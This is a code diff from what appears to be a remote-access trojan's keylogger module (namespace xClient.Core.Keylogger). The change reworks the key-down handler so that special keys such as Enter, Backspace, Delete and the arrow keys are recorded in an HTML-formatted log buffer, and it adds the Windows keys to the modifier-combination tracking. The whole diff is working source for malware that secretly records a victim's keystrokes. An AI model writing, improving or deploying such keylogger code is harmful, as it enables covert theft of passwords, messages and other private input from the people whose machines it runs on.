@@ -131,10 +131,48 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            //Because we are processing two different event arguments between this method (OnKeyDown) and the Logger_KeyPress method, we need to choose which methods will process which keys.
-            //We need to indicate that this method will be used to process all keys that aren't translated to unicode characters.
-            if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
-                PressedKeys.Add(e.KeyCode);
+            if (PressedKeys.Contains(Keys.LControlKey)
+                || PressedKeys.Contains(Keys.RControlKey)
+                || PressedKeys.Contains(Keys.LMenu)
+                || PressedKeys.Contains(Keys.RMenu)
+                || PressedKeys.Contains(Keys.LWin)
+                || PressedKeys.Contains(Keys.RWin))
+            {
+                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
+                    PressedKeys.Add(e.KeyCode);
+            }
+            else if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
+                || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
+                || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
+                || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
+                || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
+                || (e.KeyCode == Keys.CapsLock)))
+            {
+                return;
+            }
+            else if (e.KeyCode == Keys.Enter)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(ENTER)</font><br>"); //this could be where the KeyloggerKeys enum would be handy
+            }
+            else if (e.KeyCode == Keys.Space)
+            {
+                _logFileBuffer.Append(" ");
+            }
+            else if (e.KeyCode == Keys.Back)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(BACK)</font>");
+            }
+            else if (e.KeyCode == Keys.Delete)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(DEL)</font>");
+            }
+            else if (e.KeyCode >= Keys.Left && e.KeyCode <= Keys.Down)
+            {
+                _logFileBuffer.Append("<font color=\"0000FF\">(" + e.KeyCode.ToString() + ")</font>");
+            }
+            else
+                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
+                    PressedKeys.Add(e.KeyCode);
         }
 
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
@@ -161,7 +199,9 @@ namespace xClient.Core.Keylogger
             if (PressedKeys.Contains(Keys.LControlKey)
                 || PressedKeys.Contains(Keys.RControlKey)
                 || PressedKeys.Contains(Keys.LMenu)
-                || PressedKeys.Contains(Keys.RMenu))
+                || PressedKeys.Contains(Keys.RMenu)
+                || PressedKeys.Contains(Keys.LWin)
+                || PressedKeys.Contains(Keys.RWin))
             {
                 StringBuilder specialKeys = new StringBuilder();
 
